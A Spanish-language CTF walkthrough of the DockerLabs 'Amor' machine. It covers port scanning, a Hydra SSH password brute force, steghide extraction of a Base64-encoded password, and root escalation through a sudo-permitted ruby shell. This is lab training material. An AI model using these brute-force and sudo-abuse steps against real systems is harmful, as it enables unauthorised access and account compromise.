---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Amor DockerLabs (Easy)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip amor.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh amor.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 12:33 EST
Nmap scan report for 172.17.0.2
Host is up (0.000029s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 7e:72:b6:8b:5f:7c:23:64:dc:15:21:32:5f:ce:40:0a (ECDSA)
|_  256 05:8a:a7:27:0f:88:b9:70:84:ec:6d:33:dc:ce:09:6f (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: SecurSEC S.L
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.18 seconds
```

Si entramos en la pagina veremos el siguiente nombre en este apartado:

<figure><img src="../../.gitbook/assets/image (186).png" alt=""><figcaption></figcaption></figure>

Por lo que vemos tendremos un nombre de usuario, vamos a probar a realizar fuerza bruta con `hydra`.

## Escalate user carlota

### Hydra

```shell
hydra -l carlota -P <WORDLIST> ssh://<IP> -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-17 12:36:15
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: carlota   password: babygirl
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 25 final worker threads did not complete until end.
[ERROR] 25 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-17 12:36:22
```

Vemos que hemos obtenido unas credenciales, por lo que entraremos por `SSH`.

### SSH

```shell
ssh carlota@<IP>
```

Metemos como contraseña `babygirl` y veremos que estamos dentro.

## Escalate user oscar

Si nos vamos a la siguiente ruta:

```shell
cd /home/carlota/Desktop/fotos/vacaciones
```

Veremos un archivo llamado `imagen.jpg`, que podemos sospechar de que pueda tener algo en su interior, ya que no encontramos ningun vector de entrada mas, por lo que nos lo pasaremos a nuestro `host`.

```shell
python3 -m http.server
```

Y ahora en nuestro `host` ejecutaremos lo siguiente:

```shell
wget http://<IP>:8000/imagen.jpg
```

Ahora veremos que tiene algo dentro con el siguiente comando:

```shell
steghide extract -sf imagen.jpg
```

Info:

```
Enter passphrase: 
wrote extracted data to "secret.txt".
```

Vemos que nos extrae un archivo llamado `secret.txt` y si lo leemos veremos lo siguiente:

```
ZXNsYWNhc2FkZXBpbnlwb24=
```

Por lo que vemos esta en `Base64`, y si lo decodificamos quedara de esta forma:

```shell
echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d
```

Info:

```
eslacasadepinypon
```

Por lo que vemos puede ser la contraseña de algun usuario del sistema, por lo que vamos a probar con el siguiente usuario.

```shell
su oscar
```

Metemos como contraseña `eslacasadepinypon` y veremos que somos dicho usuario.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for oscar on caa1dc877f39:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User oscar may run the following commands on caa1dc877f39:
    (ALL) NOPASSWD: /usr/bin/ruby
```

Vemos que podemos ejecutar el binario `ruby` como el usuario `root`, por lo que haremos lo siguiente:

```shell
sudo ruby -e 'exec "/bin/bash"'
```

Info:

```
root@caa1dc877f39:/home/carlota/Desktop/fotos/vacaciones# whoami
root
```

Y con esto ya seremos `root`, por lo que habremos terminado la maquina.
